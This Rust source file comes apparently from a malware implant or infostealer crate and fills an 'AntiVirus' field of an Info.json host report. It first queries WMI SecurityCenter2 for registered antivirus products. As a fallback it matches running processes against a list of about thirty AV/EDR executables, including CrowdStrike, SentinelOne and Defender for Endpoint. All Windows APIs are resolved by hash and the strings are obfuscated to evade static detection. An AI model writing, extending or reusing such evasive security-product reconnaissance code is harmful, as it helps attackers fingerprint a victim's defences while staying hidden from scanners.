//! AntiVirus detection for Info.json's AntiVirus field.
//!
//! Primary: WMI `root\SecurityCenter2` AntiVirusProduct displayName
//! enumeration over raw COM (no wmi crate in the dependency tree; all COM
//! entry points are hash-resolved like the rest of the crate). Fallback:
//! known AV/EDR process names via Toolhelp32. Returns None when both fail.

use std::ffi::c_void;

use crate::resolve::{resolve, wide};

type Handle = *mut c_void;

#[repr(C)]
struct Guid {
    d1: u32,
    d2: u16,
    d3: u16,
    d4: [u8; 8],
}

// CLSID_WbemLocator {4590F811-1D3A-11D0-891F-00AA004B2E24}
const CLSID_WBEM_LOCATOR: Guid = Guid {
    d1: 0x4590F811,
    d2: 0x1D3A,
    d3: 0x11D0,
    d4: [0x89, 0x1F, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24],
};
// IID_IWbemLocator {DC12A687-737F-11CF-884D-00AA004B2E24}
const IID_IWBEM_LOCATOR: Guid = Guid {
    d1: 0xDC12A687,
    d2: 0x737F,
    d3: 0x11CF,
    d4: [0x88, 0x4D, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24],
};

const CLSCTX_INPROC_SERVER: u32 = 0x1;
const COINIT_APARTMENTTHREADED: u32 = 0;
const RPC_E_CHANGED_MODE: i32 = 0x8001_0106u32 as i32;
const RPC_C_AUTHN_WINNT: u32 = 10;
const RPC_C_AUTHZ_NONE: u32 = 0;
const RPC_C_AUTHN_LEVEL_CALL: u32 = 3;
const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
const EOAC_NONE: u32 = 0;
const WBEM_FLAG_FORWARD_ONLY: i32 = 0x20;
const WBEM_FLAG_RETURN_IMMEDIATELY: i32 = 0x10;
const WBEM_INFINITE: i32 = -1;
const VT_BSTR: u16 = 8;

/// vtable slot `index` of a COM object.
unsafe fn ventry(obj: Handle, index: usize) -> usize {
    let vtbl = *(obj as *const *const usize);
    vtbl.add(index).read()
}

/// IUnknown::Release (vtable index 2); null-tolerant.
unsafe fn release(obj: Handle) {
    if obj.is_null() {
        return;
    }
    let f: unsafe extern "system" fn(Handle) -> u32 = std::mem::transmute(ventry(obj, 2));
    f(obj);
}

type SysAllocStringFn = unsafe extern "system" fn(*const u16) -> *mut u16;
type SysFreeStringFn = unsafe extern "system" fn(*mut u16);
type SysStringLenFn = unsafe extern "system" fn(*mut u16) -> u32;

/// IWbemServices::ExecQuery result enumerator walk: collect displayName of
/// every AntiVirusProduct instance.
unsafe fn collect_product_names(
    enumerator: Handle,
    sys_alloc: SysAllocStringFn,
    sys_free: SysFreeStringFn,
    sys_len: SysStringLenFn,
    variant_clear: unsafe extern "system" fn(*mut c_void) -> i32,
) -> Vec<String> {
    type NextFn = unsafe extern "system" fn(Handle, i32, u32, *mut Handle, *mut u32) -> i32;
    type GetFn =
        unsafe extern "system" fn(Handle, *mut u16, i32, *mut c_void, *mut i32, *mut i32) -> i32;

    let mut names: Vec<String> = Vec::new();
    let prop_name = wide("displayName");
    let prop = sys_alloc(prop_name.as_ptr());
    if prop.is_null() {
        return names;
    }
    for _ in 0..32 {
        let mut obj: Handle = std::ptr::null_mut();
        let mut returned: u32 = 0;
        let next: NextFn = std::mem::transmute(ventry(enumerator, 4));
        let hr = next(enumerator, WBEM_INFINITE, 1, &mut obj, &mut returned);
        if hr < 0 || returned == 0 || obj.is_null() {
            break;
        }
        // VARIANT is 24 bytes on x64: vt at 0, payload union at 8.
        let mut var = [0u8; 24];
        let get: GetFn = std::mem::transmute(ventry(obj, 4));
        if get(
            obj,
            prop,
            0,
            var.as_mut_ptr() as *mut c_void,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        ) >= 0
        {
            let vt = u16::from_le_bytes([var[0], var[1]]);
            if vt == VT_BSTR {
                let bstr = usize::from_le_bytes(var[8..16].try_into().unwrap()) as *mut u16;
                if !bstr.is_null() {
                    let len = sys_len(bstr) as usize;
                    if len > 0 && len < 256 {
                        let s = String::from_utf16_lossy(std::slice::from_raw_parts(bstr, len));
                        let s = s.trim().to_string();
                        if !s.is_empty() && !names.iter().any(|n| n == &s) {
                            names.push(s);
                        }
                    }
                }
            }
            variant_clear(var.as_mut_ptr() as *mut c_void);
        }
        release(obj);
    }
    sys_free(prop);
    names
}

fn wmi_antivirus() -> Option<String> {
    type CoInitializeExFn = unsafe extern "system" fn(*mut c_void, u32) -> i32;
    type CoCreateInstanceFn =
        unsafe extern "system" fn(*const Guid, Handle, u32, *const Guid, *mut Handle) -> i32;
    type CoSetProxyBlanketFn = unsafe extern "system" fn(
        Handle,
        u32,
        u32,
        *mut u16,
        u32,
        u32,
        Handle,
        u32,
    ) -> i32;
    type CoUninitializeFn = unsafe extern "system" fn();
    type VariantClearFn = unsafe extern "system" fn(*mut c_void) -> i32;
    type ConnectServerFn = unsafe extern "system" fn(
        Handle,
        *mut u16,
        *mut u16,
        *mut u16,
        *mut u16,
        i32,
        *mut u16,
        Handle,
        *mut Handle,
    ) -> i32;
    type ExecQueryFn =
        unsafe extern "system" fn(Handle, *mut u16, *mut u16, i32, Handle, *mut Handle) -> i32;

    unsafe {
        let ole32 = crate::obf!("ole32.dll");
        let oleaut32 = crate::obf!("oleaut32.dll");
        let a_init = resolve(&ole32, crate::api!("CoInitializeEx"));
        let a_create = resolve(&ole32, crate::api!("CoCreateInstance"));
        let a_blanket = resolve(&ole32, crate::api!("CoSetProxyBlanket"));
        let a_uninit = resolve(&ole32, crate::api!("CoUninitialize"));
        let a_sys_alloc = resolve(&oleaut32, crate::api!("SysAllocString"));
        let a_sys_free = resolve(&oleaut32, crate::api!("SysFreeString"));
        let a_sys_len = resolve(&oleaut32, crate::api!("SysStringLen"));
        let a_vclear = resolve(&oleaut32, crate::api!("VariantClear"));
        if [a_init, a_create, a_uninit, a_sys_alloc, a_sys_free, a_sys_len, a_vclear]
            .iter()
            .any(|&a| a == 0)
        {
            return None;
        }
        let co_init: CoInitializeExFn = std::mem::transmute(a_init);
        let co_create: CoCreateInstanceFn = std::mem::transmute(a_create);
        let co_uninit: CoUninitializeFn = std::mem::transmute(a_uninit);
        let sys_alloc: SysAllocStringFn = std::mem::transmute(a_sys_alloc);
        let sys_free: SysFreeStringFn = std::mem::transmute(a_sys_free);
        let sys_len: SysStringLenFn = std::mem::transmute(a_sys_len);
        let variant_clear: VariantClearFn = std::mem::transmute(a_vclear);

        // Already-initialized (any model) is fine: WMI works from MTA too.
        let hr = co_init(std::ptr::null_mut(), COINIT_APARTMENTTHREADED);
        if hr < 0 && hr != RPC_E_CHANGED_MODE {
            return None;
        }
        let did_init = hr >= 0;

        let mut locator: Handle = std::ptr::null_mut();
        let hr = co_create(
            &CLSID_WBEM_LOCATOR,
            std::ptr::null_mut(),
            CLSCTX_INPROC_SERVER,
            &IID_IWBEM_LOCATOR,
            &mut locator,
        );
        if hr < 0 || locator.is_null() {
            if did_init {
                co_uninit();
            }
            return None;
        }

        let mut names: Vec<String> = Vec::new();
        let ns_w = wide(&crate::obf!(r"ROOT\SecurityCenter2"));
        let ns = sys_alloc(ns_w.as_ptr());
        let mut services: Handle = std::ptr::null_mut();
        let mut connected = false;
        if !ns.is_null() {
            let connect: ConnectServerFn = std::mem::transmute(ventry(locator, 3));
            let hr = connect(
                locator,
                ns,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                &mut services,
            );
            sys_free(ns);
            connected = hr >= 0 && !services.is_null();
        }
        if connected {
            // Impersonation is required for ExecQuery against the local SCM.
            if a_blanket != 0 {
                let blanket: CoSetProxyBlanketFn = std::mem::transmute(a_blanket);
                blanket(
                    services,
                    RPC_C_AUTHN_WINNT,
                    RPC_C_AUTHZ_NONE,
                    std::ptr::null_mut(),
                    RPC_C_AUTHN_LEVEL_CALL,
                    RPC_C_IMP_LEVEL_IMPERSONATE,
                    std::ptr::null_mut(),
                    EOAC_NONE,
                );
            }
            let lang_w = wide("WQL");
            let query_w = wide(&crate::obf!("SELECT displayName FROM AntiVirusProduct"));
            let lang = sys_alloc(lang_w.as_ptr());
            let query = sys_alloc(query_w.as_ptr());
            let mut enumerator: Handle = std::ptr::null_mut();
            if !lang.is_null() && !query.is_null() {
                let exec_query: ExecQueryFn = std::mem::transmute(ventry(services, 20));
                let hr = exec_query(
                    services,
                    lang,
                    query,
                    WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                    std::ptr::null_mut(),
                    &mut enumerator,
                );
                if hr >= 0 && !enumerator.is_null() {
                    names =
                        collect_product_names(enumerator, sys_alloc, sys_free, sys_len, variant_clear);
                    release(enumerator);
                }
            }
            if !lang.is_null() {
                sys_free(lang);
            }
            if !query.is_null() {
                sys_free(query);
            }
            release(services);
        }
        release(locator);
        if did_init {
            co_uninit();
        }
        if names.is_empty() {
            None
        } else {
            Some(names.join("; "))
        }
    }
}

// ---------------------------------------------------------------------------
// Fallback: known AV/EDR process names
// ---------------------------------------------------------------------------

const TH32CS_SNAPPROCESS: u32 = 0x2;

#[repr(C)]
struct ProcessEntry32W {
    dw_size: u32,
    cnt_usage: u32,
    th32_process_id: u32,
    th32_default_heap_id: usize,
    th32_module_id: u32,
    cnt_threads: u32,
    th32_parent_process_id: u32,
    pc_pri_class_base: i32,
    dw_flags: u32,
    sz_exe_file: [u16; 260],
}

/// (exe name, display name) pairs; exe names obfuscated at rest.
fn known_av_processes() -> Vec<(String, &'static str)> {
    vec![
        (crate::obf!("msmpeng.exe"), "Windows Defender"),
        (crate::obf!("msense.exe"), "Microsoft Defender for Endpoint"),
        (crate::obf!("csfalconservice.exe"), "CrowdStrike Falcon"),
        (crate::obf!("csfalconcontainer.exe"), "CrowdStrike Falcon"),
        (crate::obf!("sentinelagent.exe"), "SentinelOne"),
        (crate::obf!("sentinelservicehost.exe"), "SentinelOne"),
        (crate::obf!("elastic-endpoint.exe"), "Elastic Defend"),
        (crate::obf!("cylancesvc.exe"), "Cylance"),
        (crate::obf!("repmgr.exe"), "Carbon Black"),
        (crate::obf!("cb.exe"), "Carbon Black"),
        (crate::obf!("avp.exe"), "Kaspersky"),
        (crate::obf!("avastsvc.exe"), "Avast"),
        (crate::obf!("avgsvc.exe"), "AVG"),
        (crate::obf!("avgui.exe"), "AVG"),
        (crate::obf!("bdagent.exe"), "Bitdefender"),
        (crate::obf!("vsserv.exe"), "Bitdefender"),
        (crate::obf!("ekrn.exe"), "ESET"),
        (crate::obf!("egui.exe"), "ESET"),
        (crate::obf!("mcshield.exe"), "McAfee"),
        (crate::obf!("mfemms.exe"), "McAfee"),
        (crate::obf!("savservice.exe"), "Sophos"),
        (crate::obf!("sophosui.exe"), "Sophos"),
        (crate::obf!("mbamservice.exe"), "Malwarebytes"),
        (crate::obf!("ccsvchst.exe"), "Norton"),
        (crate::obf!("psanhost.exe"), "Panda"),
        (crate::obf!("coreserviceshell.exe"), "Trend Micro"),
        (crate::obf!("fshoster32.exe"), "F-Secure"),
        (crate::obf!("taniumclient.exe"), "Tanium"),
        (crate::obf!("cyserver.exe"), "Cybereason"),
        (crate::obf!("xagt.exe"), "FireEye"),
    ]
}

fn process_antivirus() -> Option<String> {
    type SnapshotFn = unsafe extern "system" fn(u32, u32) -> Handle;
    type FirstFn = unsafe extern "system" fn(Handle, *mut ProcessEntry32W) -> i32;
    type NextFn = unsafe extern "system" fn(Handle, *mut ProcessEntry32W) -> i32;

    unsafe {
        let k32 = "kernel32.dll";
        let a_snap = resolve(k32, crate::api!("CreateToolhelp32Snapshot"));
        let a_first = resolve(k32, crate::api!("Process32FirstW"));
        let a_next = resolve(k32, crate::api!("Process32NextW"));
        if a_snap == 0 || a_first == 0 || a_next == 0 {
            return None;
        }
        let snapshot: SnapshotFn = std::mem::transmute(a_snap);
        let first: FirstFn = std::mem::transmute(a_first);
        let next: NextFn = std::mem::transmute(a_next);

        let known = known_av_processes();
        let mut found: Vec<&'static str> = Vec::new();
        let snap = snapshot(TH32CS_SNAPPROCESS, 0);
        if snap.is_null() || snap as isize == -1 {
            return None;
        }
        let mut entry: ProcessEntry32W = std::mem::zeroed();
        entry.dw_size = std::mem::size_of::<ProcessEntry32W>() as u32;
        if first(snap, &mut entry) != 0 {
            loop {
                let len = entry
                    .sz_exe_file
                    .iter()
                    .position(|&c| c == 0)
                    .unwrap_or(entry.sz_exe_file.len());
                let name = String::from_utf16_lossy(&entry.sz_exe_file[..len]).to_lowercase();
                for (exe, display) in &known {
                    if *exe == name && !found.iter().any(|d| d == display) {
                        found.push(display);
                    }
                }
                if next(snap, &mut entry) == 0 {
                    break;
                }
            }
        }
        let a_close = resolve(k32, crate::api!("CloseHandle"));
        if a_close != 0 {
            let close: unsafe extern "system" fn(Handle) -> i32 = std::mem::transmute(a_close);
            close(snap);
        }
        if found.is_empty() {
            None
        } else {
            Some(found.join("; "))
        }
    }
}

/// Registered AV products (WMI), else known AV processes, else None.
pub fn detect() -> Option<String> {
    std::panic::catch_unwind(|| wmi_antivirus().or_else(process_antivirus))
        .ok()
        .flatten()
}
